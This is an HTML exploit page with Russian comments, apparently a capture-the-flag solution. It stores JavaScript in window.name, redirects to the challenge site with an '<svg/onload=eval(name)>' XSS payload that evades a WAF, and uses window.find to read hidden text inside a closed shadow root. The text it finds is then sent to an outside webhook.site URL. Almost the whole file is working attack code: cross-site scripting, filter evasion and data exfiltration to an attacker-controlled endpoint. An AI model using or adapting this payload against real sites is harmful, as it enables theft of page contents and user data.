<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <script>
        // 1. Записываем вредоносный код в имя окна (window.name)
        // Этот код переживет переход на другую страницу.
        // WAF задачи его не видит, так как он не в адресной строке.
        window.name = `
            // Даем странице немного времени на загрузку (500мс)
            setTimeout(function(){
                // Используем window.find, чтобы найти скрытый текст в Shadow DOM
                // Это уникальная фишка Chrome: поиск работает даже внутри closed shadow-root
                window.find('p_ctf');
                
                // Получаем выделенный текст
                var sel = window.getSelection();
                if (sel && sel.anchorNode) {
                    var flag = sel.anchorNode.textContent;
                    // Отправляем флаг на ваш вебхук
                    fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?flag=' + encodeURIComponent(flag));
                } else {
                    // Если не нашли, отправляем ошибку (для отладки)
                    fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=FlagNotFound');
                }
            }, 1000);
        `;

        // 2. Сразу перенаправляем текущую страницу на уязвимую задачу.
        // Браузер сохранит window.name при переходе.
        // Payload: <svg/onload=eval(name)> — он короткий и вызывает код из window.name
        window.location.href = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(name)%3E&avatar=https://picsum.photos/100";
    </script>
</body>
</html>
